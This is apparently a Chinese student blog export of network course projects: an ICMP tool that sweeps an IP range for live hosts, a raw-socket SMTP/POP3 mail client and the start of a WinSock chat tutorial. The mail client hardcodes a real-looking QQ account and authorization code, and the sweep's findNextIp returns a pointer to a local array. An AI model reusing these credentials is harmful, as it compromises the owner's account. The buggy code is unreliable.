//16 位总长度： 和头部长度一起就能区分 头 主体数据了 unsigned short identifier; //16 位标识符: 作用是分片后的重组 unsigned short frag_and_flags; //3 位标志加 13 位片偏移： 标志：MF 1是否还有分配 0 没有分片了 // DF 0 可以分片 // 片偏移：分片后的相对于原来的偏移 unsigned char ttl; //8 位生存时间 unsigned char protocol; //8 位上层协议号： 指出是何种协议 unsigned short checksum; //16 位校验和： 检验是否出错 unsigned long sourceIP; //32 位源 IP 地址 unsigned long destIP; //32 位目的 IP 地址&#125; IP_HEADER;//ICMP 报头，一共八个字节，前四个字节为：类型（1字节）、代码（1字节）和检验和（2字节）。后四个字节取决于类型typedef struct&#123; BYTE type; //8 位类型字段：标识ICMP的作用 BYTE code; //8 位代码字段 USHORT cksum; //16 位校验和 USHORT id; //16 位标识符 USHORT seq; //16 位序列号&#125; ICMP_HEADER;//报文解码结构//接收到的数据缓存是字符数组char bufRev[]，因此需要通过特定的解析（也就是拆成一段一段的）获取想要的信息//把信息封装到结构体中，就比较方便的得到序列号、往返时间和目的IP了。typedef struct&#123; USHORT usSeqNo; //序列号 DWORD dwRoundTripTime; //往返时间 in_addr dwIPaddr; //返回报文的 IP 地址&#125; DECODE_RESULT;//计算网际校验和函数USHORT checksum(USHORT *pBuf, int iSize)&#123; unsigned long cksum = 0; while (iSize &gt; 1) &#123; cksum += *pBuf++; iSize -= sizeof(USHORT); &#125; if (iSize) &#123; cksum += *(UCHAR *)pBuf; &#125; cksum = (cksum &gt;&gt; 16) + (cksum &amp; 0xffff); cksum += (cksum &gt;&gt; 16); return (USHORT)(~cksum);&#125;//对数据包进行解码// 1）接收到的Buf 2）接收到的数据长度 3）解析结果封装到Decode 4）ICMP回显类型 5）TIMEOUT时间BOOL DecodeIcmpResponse2(char * pBuf, int iPacketSize, DECODE_RESULT &amp;DecodeResult, BYTE ICMP_ECHO_REPLY, BYTE ICMP_TIMEOUT)&#123; //查找数据报大小合法性 //pBuf的首地址，就是IP报的首地址 IP_HEADER *pIpHdr = (IP_HEADER*)pBuf; int iIpHdrLen = pIpHdr-&gt;hdr_len * 4; if(iPacketSize &lt; (int)(iIpHdrLen + sizeof(ICMP_HEADER))) return FALSE; // 根据 ICMP 报文类型提取 ID 字段和序列号字段 //ICMP字段包含在 IP数据段的起始位置，因此扣掉IP头，得到的就是ICMP头 ICMP_HEADER *pIcmpHdr = (ICMP_HEADER *)(pBuf + iIpHdrLen); USHORT usID, usSquNo; if (pIcmpHdr-&gt;type == ICMP_ECHO_REPLY) // ICMP 回显应答报文 &#123; usID = pIcmpHdr-&gt;id;//报文 ID usSquNo = pIcmpHdr-&gt;seq;//报文序列号 &#125; else if (pIcmpHdr-&gt;type == ICMP_TIMEOUT)//ICMP超时差错报文 &#123; // 如果是TIMEOUT ，那么在ICMP数据包中，会夹带一个IP报（荷载IP） char * pInnerIpHdr = pBuf + iIpHdrLen + sizeof(ICMP_HEADER); // 荷载中的 IP 的头 int iInnerIPHdrLen = ((IP_HEADER*)pInnerIpHdr)-&gt;hdr_len * 4;// 荷载中的IP 头长度 ICMP_HEADER * pInnerIcmpHdr = (ICMP_HEADER*)(pInnerIpHdr + iInnerIPHdrLen); //荷载中的ICMP头 usID = pInnerIcmpHdr-&gt;id;// 报文ID usSquNo = pInnerIcmpHdr-&gt;seq; // 序列号 &#125; else &#123; return false; &#125; // 检查 ID 和序列号以确定收到期待数据报 if (usID != (USHORT)GetCurrentProcessId() || usSquNo != DecodeResult.usSeqNo) &#123; return false; &#125; // 记录 IP 地址并计算往返时间 DecodeResult.dwIPaddr.S_un.S_addr = pIpHdr-&gt;sourceIP; DecodeResult.dwRoundTripTime = GetTickCount() - DecodeResult.dwRoundTripTime; //处理正确收到的 ICMP 数据包 if (pIcmpHdr-&gt;type == ICMP_ECHO_REPLY || pIcmpHdr-&gt;type == ICMP_TIMEOUT) &#123; // 输出往返时间信息 if (DecodeResult.dwRoundTripTime) cout &lt;&lt; &quot; &quot; &lt;&lt; DecodeResult.dwRoundTripTime &lt;&lt; &quot;ms&quot; &lt;&lt; flush; else cout &lt;&lt; &quot; &quot; &lt;&lt; &quot;&lt;1ms&quot; &lt;&lt; flush; &#125; return true;&#125;char * findNextIp(char * nowIp);int main()&#123; //初始化 Windows sockets 网络环境 WSADATA wsa;//存储被WSAStartup函数调用后返回的Windows Sockets数据 //使用Socket的程序在使用Socket之前必须调用WSAStartup函数，以后应用程序就可以调用所请求的Socket库中的其他Socket函数了 WSAStartup(MAKEWORD(2, 2), &amp;wsa);//进行相应的socket库绑定 cout &lt;&lt; &quot;请输入你要查找的起始IP：&quot; &lt;&lt; endl; char IpAddressBeg[ipAddressSize]; // 255.255.255.255 cin &gt;&gt; IpAddressBeg; cout &lt;&lt; &quot;请输入你要查找的终止IP：&quot; &lt;&lt; endl; char IpAddressEnd[ipAddressSize]; // 255.255.255.255 cin &gt;&gt; IpAddressEnd; char nextIpAddress[17]; strcpy(nextIpAddress, IpAddressBeg); while (strcmp(nextIpAddress, IpAddressEnd) != 0) &#123; // 执行,单线程执行，实现后改成多线程 //得到IP地址 u_long ulDestIP = inet_addr(nextIpAddress);//inet_addr()的功能是将一个点分十进制的IP转换成一个无符号长整型数 //转换不成功时按域名解析 if (ulDestIP == INADDR_NONE) &#123; //gethostbyname()是查找主机名最基本的函数 //如果调用成功，就返回一个指向hosten结构的指针 //该结构中含有对应于给定主机名的主机名字和地址信息，用来承接域名解析的结构 hostent * pHostent = gethostbyname(nextIpAddress); if (pHostent)//调用成功 &#123; //得到IP地址 //套了两层，IP和ICMP，ICMP是套在IP里面的 //h_addr返回主机IP地址 //in_addr返回报文的IP地址 //sin_addr.s_addr指向IP地址 ulDestIP = (*(in_addr*)pHostent-&gt;h_addr).s_addr; &#125; else &#123; cout &lt;&lt; &quot;输入的 IP 地址或域名无效!&quot; &lt;&lt; endl; WSACleanup();//解除与Socket库的绑定并且释放Socket库所占用的系统资源 return 0; &#125; &#125; // 填充目的 sockaddr_in sockaddr_in destSockAddr;//sockaddr_in是Internet环境下套接字的地址形式 //将指定的内存块清零，使用结构前清零，而不让结构体的成员数值具有不确定性，是一个好的编程习惯 ZeroMemory(&amp;destSockAddr, sizeof(sockaddr_in)); destSockAddr.sin_family = AF_INET;//指代协议簇，在socket编程中只能是AF_INET destSockAddr.sin_addr.S_un.S_addr = ulDestIP;//按照网络字节顺序存储IP地址 //创建原始套接字 //WSASocket()的发送操作和接收操作都可以被重叠使用。接收函数可以被多次调用，发出接收缓冲区，准备接收到来的数据。发送函数也可以被多次调用，组成一个发送缓冲区队列 //如无错误发生，返回新套接口的描述字，否则的话，返回INVALID_SOCKET //AF_INET为地址簇描述，SOCK_RAW为新套接口的类型描述，SOCK_RAW为原始套接字，可处理PING报文等 //IPPROTO_ICMP为套接口使用的协议，为ICMP；NULL是一个指向PROTOCOL_INFO结构的指针，该结构定义所创建套接口的特性 //0为套接口的描述字；WSA_FLAG_OVERLAPPED为套接口属性描述，WSA_FLAG_OVERLAPPED表示要使用重叠模型 SOCKET sockRaw = WSASocket(AF_INET, SOCK_RAW, IPPROTO_ICMP, NULL, 0, WSA_FLAG_OVERLAPPED); // 设置发送接收超时时间，即请求超时 //比如请求B站的一个视频，他超过一个时间没回我，我就认为超时了 //超时时间是可能变化的，这个超时时间用来存储在不同的变量，它刚好在一个变量而已 int iTimeout = 500;//如果没超过超时时间就会一直等着，超过超时时间就不等了 //接收超时 //sockRaw为将要被设置或者获取选项的套接字；SOL_SOCKET为在套接字级别上设置选项；SO_RCVTIMEO设置接收超时时间 //(char*)&amp;iTimeout指向存放选项值的缓冲区；sizeof(iTimeout)为缓冲区的长度 setsockopt(sockRaw, SOL_SOCKET, SO_RCVTIMEO, (char *)&amp;iTimeout, sizeof(iTimeout)); //发送超时 //sockRaw为将要被设置或者获取选项的套接字；SOL_SOCKET为在套接字级别上设置选项；SO_SNDTIMEO设置发送超时时间 //(char*)&amp;iTimeout指向存放选项值的缓冲区；sizeof(iTimeout)为缓冲区的长度 setsockopt(sockRaw, SOL_SOCKET, SO_SNDTIMEO, (char *)&amp;iTimeout, sizeof(iTimeout)); // 构造 ICMP 回显请求消息， 并以TTL 递增顺序发送报文 // ICMP 类型字段 //采用const修饰变量，功能是对变量声明为只读特性，并保护变量值以防被修改 const BYTE ICMP_ECHO_REQUEST = 8;//请求回显 const BYTE ICMP_ECHO_REPLY = 0;//回显应答 //其他常量定义 const int DEF_ICMP_DATA_SIZE = 32; // ICMP 报文默认数据字段长度 const int MAX_ICMP_PACKET_SIZE = 1024;//ICMP 报文最大长度（加上报头） const DWORD DEF_ICMP_TIMEOUT = 500;// 回显应答超时时间 const int DEF_MAX_HOP = 20; // 最大跳站数 // 填充 ICMP 报文中每次发送时不变的字段 char IcmpSendBuf[sizeof(ICMP_HEADER) + DEF_ICMP_DATA_SIZE];// 发送缓冲区 memset(IcmpSendBuf, 0, sizeof(IcmpSendBuf));//初始化发送缓冲区 char IcmpRecvBuf[MAX_ICMP_PACKET_SIZE]; // 接收缓冲区 memset(IcmpRecvBuf, 0, sizeof(IcmpRecvBuf)); //初始化接收缓冲区 // 构造ICMP头 ICMP_HEADER * pIcmpHeader = (ICMP_HEADER*)IcmpSendBuf; pIcmpHeader-&gt;type = ICMP_ECHO_REQUEST; // 类型为请求回显 pIcmpHeader-&gt;code = 0;//代码字段为0 pIcmpHeader-&gt;id = (USHORT)GetCurrentProcessId();// ID字段为当前进程号 memset(IcmpSendBuf + sizeof(ICMP_HEADER), &#x27;E&#x27;, DEF_ICMP_DATA_SIZE);//数据字段 USHORT usSeqNo = 0; // ICMP 报文序列号 int iTTL = 1; // TTL初始化值为1 BOOL bReachDestHost = FALSE; // 循环退出标志 int iMaxHot = DEF_MAX_HOP; // 最大循环数 DECODE_RESULT DecodeResult;// 传递给报文解码函数的结构化参数 //int count11=0; while (!bReachDestHost &amp;&amp; iMaxHot--) &#123; bReachDestHost = FALSE; // 设置 IP 报头的 TTL 字段 //sockRaw为将要被设置或者获取选项的套接字；IPPROTO_IP为套接口使用的协议，为IP；IP_TTL为设置IP报头的TTL字段 //(char*)&amp;iTTL指向存放选项值的缓冲区；sizeof(iTTL)为缓冲区的长度 setsockopt(sockRaw, IPPROTO_IP, IP_TTL, (char *)&amp;iTTL, sizeof(iTTL)); cout &lt;&lt; iTTL &lt;&lt; flush; // 输出当前序号,flush的作用是刷新缓冲区 // 填充 ICMP报文中每次发送变化的字段 ((ICMP_HEADER *)IcmpSendBuf)-&gt;cksum = 0;//校验和为0 ((ICMP_HEADER *)IcmpSendBuf)-&gt;seq = htons(usSeqNo++);// 填充序列号 ((ICMP_HEADER *)IcmpSendBuf)-&gt;cksum = checksum((USHORT *)IcmpSendBuf, sizeof(ICMP_HEADER) + DEF_ICMP_DATA_SIZE); //计算校验和 // 记录序列号和当前时间 DecodeResult.usSeqNo = ((ICMP_HEADER*)IcmpSendBuf)-&gt;seq;//当前序号 DecodeResult.dwRoundTripTime = GetTickCount();// 当前时间 // 指定对方信息 // 发送 TCP 回显请求信息 //sendto()利用数据报的方式进行数据传输 // 1）指定哪个Socket发给对方 2）发送的数据 3）flag 4）目的地址 5）目的地址的sockaddr_in结构 sendto(sockRaw, IcmpSendBuf, sizeof(IcmpSendBuf), 0, (sockaddr*)&amp;destSockAddr, sizeof(destSockAddr)); //接收 ICMP 差错报文并进行解析 sockaddr_in from; // 对端 socket地址，对方的 int iFromLen = sizeof(from);//地址结构大小 int iReadDataLen;// 接收数据长度 // 接收正常的话，这个循环只会执行一次 while (true) &#123; //接收数据 //recvfrom()利用数据报方式进行数据传输 //当recvfrom（）返回时，(sockaddr*)&amp;from包含实际存入from中的数据字节数。 //Recvfrom（）函数返回接收到的字节数或当出现错误时返回－1，并置相应的errno。 iReadDataLen = recvfrom(sockRaw, IcmpRecvBuf, MAX_ICMP_PACKET_SIZE, 0, (sockaddr*)&amp;from, &amp; iFromLen); if (iReadDataLen != SOCKET_ERROR) // 有数据到达 &#123; //解析数据包 // 1）接收到的Buf 2）接收到的数据长度 3）解析结果封装到Decode 4）ICMP回显类型 5）TIMEOUT时间 if (DecodeIcmpResponse2(IcmpRecvBuf, iReadDataLen, DecodeResult, ICMP_ECHO_REPLY, DEF_ICMP_TIMEOUT)) &#123; // 到达目的地，退出循环 //返回报文的IP地址等于输入的IP地址 if (DecodeResult.dwIPaddr.S_un.S_addr == destSockAddr.sin_addr.S_un.S_addr) &#123; bReachDestHost = true; // 输出 IP 地址 //inet_ntoa()功能是将网络地址转换成“.”点隔的字符串格式。 cout &lt;&lt; &#x27;\\t&#x27; &lt;&lt; inet_ntoa(DecodeResult.dwIPaddr) &lt;&lt; endl; strcpy(nextIpAddress, inet_ntoa(DecodeResult.dwIPaddr)); break; &#125; &#125; &#125; //WSAGetLastError()当一特定的Sockets API函数指出一个错误已经发生，该函数就应调用来获得对应的错误代码。 //WSAETIMEDOUT在尝试连接超时,而不建立连接。 else if (WSAGetLastError() == WSAETIMEDOUT) //接收超时，输出*号 &#123; cout &lt;&lt; &quot; *&quot; &lt;&lt; &#x27;\\t&#x27; &lt;&lt; &quot;Request timed out.&quot; &lt;&lt; endl; break; &#125; else &#123; break; &#125; &#125; iTTL++;//递增TTL值 &#125; cout &lt;&lt; &quot;查找: &quot; &lt;&lt; nextIpAddress &lt;&lt; &quot;结果为 -&gt;&quot; &lt;&lt; (bReachDestHost ? &quot;在线&quot; : &quot;不在线&quot;) &lt;&lt; endl; //if nextIpAddress ==bReachDestHost; // 向下推 strcpy(nextIpAddress, findNextIp(nextIpAddress)); &#125; return 0;&#125;char * findNextIp(char * nowIp)&#123; char nextIpAddress[ipAddressSize]; char z[4][4]; int idxIp = 0, idxj = 0; for (int i = 0; i &lt; strlen(nowIp); i++) &#123; if (nowIp[i] == &#x27;.&#x27;) &#123; z[idxIp][idxj] = &#x27;\\0&#x27;; idxIp++; idxj = 0; continue; &#125; z[idxIp][idxj++] = nowIp[i]; &#125; z[idxIp][idxj] = &#x27;\\0&#x27;; for (int i = 3; i &gt;= 0; i--) &#123; if (strcmp(&quot;254&quot;, z[i]) == 0) &#123; strcpy(z[i], &quot;1&quot;); // 这里让ip 1-254 &#125; else &#123; int x; x = atoi(z[i]) + 1; itoa(x,z[i],10); // 第三个参数是 int的进制 break; &#125; &#125; char retIp[ipAddressSize]; strcpy(retIp, z[0]); char c[2] = &quot;.&quot;; for (int i = 1; i &lt; 4; i++) &#123; strcat(retIp, c); strcat(retIp, z[i]); &#125; /*cout &lt;&lt; retIp &lt;&lt; endl;*/ return retIp;&#125;","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"计算机网络课程设计-电子邮件客户端程序设计与实现","date":"2021-12-28T05:51:24.000Z","path":"2021/12/28/计算机网络课程设计-电子邮件客户端程序设计与实现/","text":"电子邮件客户端程序设计与实现今天是课程设计的第二天，这次课程设计我只打算做五个实验，这是第二个。 设计步骤调试过程首先要配置测试使用的QQ邮箱，不然会出现服务器响应为:Error: need EHLO and AUTH first !”问题。 配置qq邮箱的步骤及填写授权码1、首先在QQ邮箱当中开启“POP3/SMTP服务” 2、开启后点击下方生成授权码 3、使用base64加密账号与密码 4、使用base64加密后的授权码替代登陆密码，如下图所示： 5.尝试调试程序 设计结果及结果分析查看邮件： 发送邮件： 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;WinSock2.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;using namespace std;#pragma comment(lib, &quot;ws2_32.lib&quot;) /*链接ws2_32.lib动态链接库*/void mail()&#123;char buff[50000]; //收到recv函数返回的结果 string message; string info; string subject; WSADATA wsaData; WORD wVersionRequested = MAKEWORD(2, 1); //WSAStarup，即WSA(Windows SocKNDs Asynchronous，Windows套接字异步)的启动命令 int err = WSAStartup(wVersionRequested, &amp;wsaData); SOCKADDR_IN addrServer; //服务端地址 HOSTENT *pHostent;//hostent是host entry的缩写，该结构记录主机的信息，包括主机名、别名、地址类型、地址长度和地址列表 SOCKET sockClient; //客户端的套接字 /* 使用 MAIL 命令指定发送者 使用 RCPT 命令指定接收者，可以重复使用RCPT指定多个接收者 */ cout &lt;&lt; &quot;你想查看邮件还是发邮件？\\n\\t1.查看邮箱\\n\\t2.发送邮件\\n&quot;; int call; cin &gt;&gt; call; if (call == 2) &#123; sockClient = socket(AF_INET, SOCK_STREAM, 0); //建立socket对象 pHostent = gethostbyname(&quot;smtp.qq.com&quot;); //得到有关于域名的信息,链接到qq邮箱服务器 addrServer.sin_addr.S_un.S_addr = *((DWORD *) pHostent-&gt;h_addr_list[0]); //得到smtp服务器的网络字节序的ip地址 addrServer.sin_family = AF_INET; addrServer.sin_port = htons(25); //连接端口25 //int connect (SOCKET s , const struct sockaddr FAR *name , int namelen ); //函数原型 err = connect(sockClient, (SOCKADDR *) &amp;addrServer, sizeof(SOCKADDR)); //向服务器发送请求 buff[recv(sockClient, buff, 500, 0)] = &#x27;\\0&#x27;; /* 登录邮件服务器 */ message = &quot;ehlo qq.com\\r\\n&quot;; send(sockClient, message.c_str(), message.length(), 0); //发送ehlo命令 buff[recv(sockClient, buff, 500, 0)] = &#x27;\\0&#x27;; //接收返回值 // cout &lt;&lt;&quot;1&quot; &lt;&lt; buff &lt;&lt; endl; message = &quot;auth login\\r\\n&quot;; send(sockClient, message.c_str(), message.length(), 0); buff[recv(sockClient, buff, 500, 0)] = &#x27;\\0&#x27;; // cout &lt;&lt;&quot;2&quot; &lt;&lt; buff &lt;&lt; endl; /* 发送base64加密的用户名、密码 */ message = &quot;MTAyNTE0MjkzMg==\\r\\n&quot;; send(sockClient, message.c_str(), message.length(), 0); buff[recv(sockClient, buff, 500, 0)] = &#x27;\\0&#x27;; // cout &lt;&lt;&quot;3&quot; &lt;&lt; buff &lt;&lt; endl; message = &quot;bXhkeXd1ZnVhcHVnYmVlag==\\r\\n&quot;;/**/ send(sockClient, message.c_str(), message.length(), 0); buff[recv(sockClient, buff, 500, 0)] = &#x27;\\0&#x27;; // cout &lt;&lt;&quot;4&quot; &lt;&lt; buff &lt;&lt; endl; /* Author:hyn Time:2021.12.28 */ string mail; cout &lt;&lt; &quot;请输入收件人邮箱：&quot;; cin &gt;&gt; mail;//1025142932@qq.com message = &quot;MAIL FROM:&lt;1025142932@qq.com&gt; \\r\\nRCPT TO:&lt;&quot;; message.append(mail); message.append(&quot;&gt; \\r\\n&quot;); send(sockClient, message.c_str(), message.length(), 0); buff[recv(sockClient, buff, 500, 0)] = &#x27;\\0&#x27;; cout &lt;&lt;&quot;5&quot; &lt;&lt; buff &lt;&lt; endl; buff[recv(sockClient, buff, 500, 0)] = &#x27;\\0&#x27;; /* 使用 DATA 命令告诉服务器要发送邮件内容 */ message = &quot;DATA\\r\\n&quot;; send(sockClient, message.c_str(), message.length(), 0); buff[recv(sockClient, buff, 500, 0)] = &#x27;\\0&#x27;; // cout &lt;&lt;&quot;6&quot; &lt;&lt; buff &lt;&lt; endl; message = &quot;From: 1025142932@qq.com\\r\\nTo: &quot; + mail + &quot;\\r\\nsubject:&quot;; cout &lt;&lt; &quot;主题：&quot;; cin &gt;&gt; subject; message.append(subject); message.append(&quot;\\r\\n\\r\\n&quot;); cout &lt;&lt; &quot;内容：&quot;; cin &gt;&gt; info; message.append(info); message.append(&quot;\\r\\n.\\r\\n&quot;); send(sockClient, message.c_str(), message.length(), 0); // cout &lt;&lt;&quot;7&quot; &lt;&lt; buff &lt;&lt; endl; message = &quot;QUIT\\r\\n&quot;; send(sockClient, message.c_str(), message.length(), 0); buff[recv(sockClient, buff, 500, 0)] = &#x27;\\0&#x27;; // cout &lt;&lt;&quot;8&quot; &lt;&lt; buff &lt;&lt; endl; cout &lt;&lt; &quot;发送成功！&quot; &lt;&lt; endl; //system(&quot;pause&quot;); &#125; if (call == 1) &#123; sockClient = socket(AF_INET, SOCK_STREAM, 0); //建立socket对象 const char *host_id = &quot;pop3.126.com&quot;; pHostent = gethostbyname(&quot;pop.qq.com&quot;); int port = 110; addrServer.sin_addr.S_un.S_addr = *((DWORD *) pHostent-&gt;h_addr_list[0]); //得到smtp服务器的网络字节序的ip地址 addrServer.sin_family = AF_INET; addrServer.sin_port = htons(port); //连接端口110 err = connect(sockClient, (SOCKADDR *) &amp;addrServer, sizeof(SOCKADDR)); //向服务器发送请求 buff[recv(sockClient, buff, 500, 0)] = &#x27;\\0&#x27;; message = &quot;user 1025142932@qq.com\\r\\n&quot;; send(sockClient, message.c_str(), message.length(), 0); //发送账号 buff[recv(sockClient, buff, 500, 0)] = &#x27;\\0&#x27;; //接收返回值 // std::cout &lt;&lt; &quot;Client : send name \\nServer:&quot; // &lt;&lt; buff &lt;&lt; std::endl; message = &quot;pass mxdywufuapugbeej\\r\\n&quot;; send(sockClient, message.c_str(), message.length(), 0); //发送授权码 buff[recv(sockClient, buff, 500, 0)] = &#x27;\\0&#x27;; //接收返回值 //std::cout &lt;&lt; &quot;Client : send pass \\nServer:&quot; // &lt;&lt; buff &lt;&lt; std::endl; message = &quot;stat\\r\\n&quot;; send(sockClient, message.c_str(), message.length(), 0); //发送状态 buff[recv(sockClient, buff, 500, 0)] = &#x27;\\0&#x27;; //接收返回值// sleep(1); //std::cout &lt;&lt; &quot;Client : send stat \\nServer : &quot; // &lt;&lt; buff &lt;&lt; std::endl; message = &quot;list\\r\\n&quot;; send(sockClient, message.c_str(), message.length(), 0); //发送状态 buff[recv(sockClient, buff, 50000, 0)] = &#x27;\\0&#x27;; //接收返回值// sleep(1); cout &lt;&lt; &quot;Client : send list \\nServer :&quot; &lt;&lt; buff &lt;&lt; endl; while(1) &#123; int n,option; cout &lt;&lt; &quot;你先想查看那一封邮件？输入序号&quot; &lt;&lt; endl; cin &gt;&gt; n; message = &quot;retr &quot; + to_string(n) + &quot;\\r\\n&quot;; send(sockClient, message.c_str(), message.length(), 0); //发送状态// sleep(1); cout &lt;&lt; &quot;Client : send retr (...) \\n&quot;; buff[recv(sockClient, buff, 50000, 0)] = &#x27;\\0&#x27;; //接收返回值 cout &lt;&lt; &quot;Server ：&quot; &lt;&lt; buff &lt;&lt; endl; cout&lt;&lt;&quot;1.继续查看 2.退出&quot;; cin&gt;&gt;option; if(option == 1) ; else break; &#125; &#125;&#125;int main()&#123; while(1)&#123; mail(); &#125;&#125;","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"湖南科技大学考研数据分析","date":"2021-12-28T02:01:29.000Z","path":"2021/12/28/湖南科技大学考研数据分析/","text":"写在前面写这个的起因是在google搜滨中老师的名字，看看能不能检索出有趣的结果。后来呢，就突发奇想搜自己的名字+科大，然后又搜索别人的名字+科大，结果就搜到了2021科大考研报考高校的统计数据，于是我顺水推舟，做了一波数据可视化。 2021科大学子考研报考热门高校先看一眼词云： 2021科大考研报考高校前20： 抛开本校，考研报考前五十名：","comments":true,"categories":[{"name":"编程随想","slug":"编程随想","permalink":"http://1905060202.github.io/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/"}],"tags":[{"name":"考研","slug":"考研","permalink":"http://1905060202.github.io/tags/%E8%80%83%E7%A0%94/"},{"name":"数据分析","slug":"数据分析","permalink":"http://1905060202.github.io/tags/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"}]},{"title":"计算机网络课程设计-网络聊天程序的设计与实现","date":"2021-12-27T07:15:48.000Z","path":"2021/12/27/计算机网络课程设计-网络聊天程序的设计与实现/","text":"网络聊天程序的设计与实现去年今日，是数据库的课程设计，用Java写一个管理系统。当时忙的不可开交，一边要写程序，一边要复习从来都没学过的几门课程。当时要复习概率论，可我一点都没看，那怎么办，就看猴博士复习。答题的时候答得一塌糊涂，成绩放榜，我概率论竟然考到了83分。此情此景，犹在脑海中。如今，2021年已至岁末，大三上学期的生活也接近尾声，可我依然没有进入到复习的状态。既然课程设计已经开始了，那就从此刻开始复习吧！ TCP/IP协议与WinSock网络编程接口的关系WinSock 并不是一种网络协议，它只是一个网络编程接口，也就是说，它不是协议，但是它可以访问很多种网络协议，你可以把它当作一些协议的封装。现在的 WinSock 已经基本上实现了与协议无关。你可以使用 WinSock 来调用多种协议的功能。那么，WinSock 和 TCP/IP 协议到底是什么关系呢？实际上，WinSock 就是 TCP/IP 协议的一种封装，你可以通过调用 WinSock 的接口函数来调用 TCP/IP 的各种功能.例如我想用 TCP/IP 协议发送数据，你就可以使用 WinSock 的接口函数 Send()来调用 TCP/IP 的发送数据功能，至于具体怎么发送数据，WinSock 已经帮你封装好了这种功能。 TCP/IP协议介绍TCP/IP 协议包含的范围非常的广，它是一种四层协议，包含了各种硬件、软件需求的定义。TCP/IP 协议确切的说法应该是 TCP/UDP/IP 协议。UDP 协议(User Datagram Protocol 用户数据报协议)，是一种保护消息边界的，不保障可靠数据的传输。TCP 协议(Transmission Control Protocol 传输控制协议)，是一种流传输的协议。他提供可靠的、有序的、双向的、面向连接的传输。 保护消息边界，就是指传输协议把数据当作一条独立的消息在网上传输，接收端只能接收独立的消息。也就是说存在保护消息边界，接收端一次只能接收发送端发出的一个数据包。 而面向流则是指无保护消息边界的，如果发送端连续发送数据，接收端有可能在一次接收动作中，会接收两个或者更多的数据包。 举例来说，假如，我们连续发送三个数据包，大小分别是 2k、4k、8k，这三个数据包都已经到达了接收端的网络堆栈中，如果使用 UDP 协议，不管我们使用多大的接收缓冲区去接收数据，我们必须有三次接收动作，才能够把所有的数据包接收完。而使用 TCP 协议，我们只要把接收的缓冲区大小设置在 14k 以上，我们就能够一次把所有的数据包接收下来，只需要有一次接收动作。 这就是因为 UDP 协议的保护消息边界使得每一个消息都是独立的。而流传输，却把数据当作一串数据流，它不认为数据是一个一个的消息。所以有很多人在使用 TCP 协议通讯的时候，并不清楚 TCP 是基于流的传输，当连续发送数据的时候，他们时常会认为 TCP 会丢包。其实不然，因为当它们使用的缓冲区足够大时，它们有可能会一次接收到两个甚至更多的数据包，而很多人往往会忽视这一点，只解析检查了第一个数据包，而已经接收的其它据包却被忽略了。 WinSock编程简单流程WinSock 编程分为服务器端和客户端两部分，TCP 服务器端的大体流程如下： 对于任何基于 WinSock 的编程首先必须要初始化 WinSock DLL 库。 int WSAStarup( WORD wVersionRequested,LPWSADATA lpWsAData )。 wVersionRequested 是我们要求使用的 WinSock 的版本。 调用这个接口函数可以初始化 WinSock 。 然后必须创建一个套接字(Socket)。 SOCKET Socket(int af,int type,int protocol); 套接字可以说是 WinSock 通讯的核心。WinSock 通讯的所有数据传输，都是通过套接字来完成的，套接字包含了两个信息，一个是 IP 地址，一个是 Port 端口号，使用这两个信息，就可以确定网络中的任何一个通讯节点。 当调用了 Socket()接口函数创建了一个套接字后，必须把套接字与你需要进行通讯的地址建立联系，可以通过绑定函数 bind 来实现这种联系。 int bind(SOCKET s,const struct sockaddr FAR* name,int namelen) ; struct sockaddr_in{ short sin_family ; u_short sin_port; struct in_addr sin_addr ; char sin_sero[8] ; } 就包含了需要建立连接的本地的地址，包括地址族、IP 和端口信息。sin_family 字段必须把它设为 AF_INET，这是告诉 WinSock 使用的是 IP 地址族。sin_port 就是要用来通讯的端口号。sin_addr 就是要用来通讯的 IP 地址信息。 在这里，必须还得提一下有关’大头(big-endian)’小头(little-endian)’。因为各种不同的计算机处理数据时的方法是不一样的，Intel X86 处理器上是用’小头’形式来表示多字节的编号，就是把低字节放在前面，把高字节放在后面，而互联网标准却正好相反，所以，必须把主机字节转换成网络字节的顺序。 WinSock API 提供了几个函数。 把主机字节转化成网络字节的函数; u_long htonl(u_long hostlong); u_short htons(u_short hostshort); 把网络字节转化成主机字节的函数; u_long ntohl(u_long netlong); u_short ntohs(u_short netshort) ; 这样，设置 IP 地址和 port 端口时，就必须把主机字节转化成网络字节后，才能用 Bind()函数来绑 定套接字和地址。 当绑定完成之后，服务器端必须建立一个监听的队列来接收客户端的连接请求。 int listen(SOCKET s,int backlog); 这个函数可以把套接字转成监听模式。如果客户端有了连接请求，我们还必须使用 int accept(SOCKET s,struct sockaddr FAR* addr,int FAR* addrlen); 来接受客户端的请求。 现在基本上已经完成了一个服务器的建立，而客户端的建立的流程则是初始化 WinSock，然后创 建 Socket 套接字，再使用 int connect(SOCKET s,const struct sockaddr FAR* name,int namelen) ; 来连接服务端。下面是一个最简单的创建服务器端和客户端的例子： 服务器端的创建： 123456789101112131415161718192021WSADATA wsd; SOCKET sListen; SOCKET sclient;UINT port = 800;int iAddrSize; struct sockaddr_in local , client;WSAStartup( 0x11 , &amp;wsd ); sListen = Socket ( AF_INET , 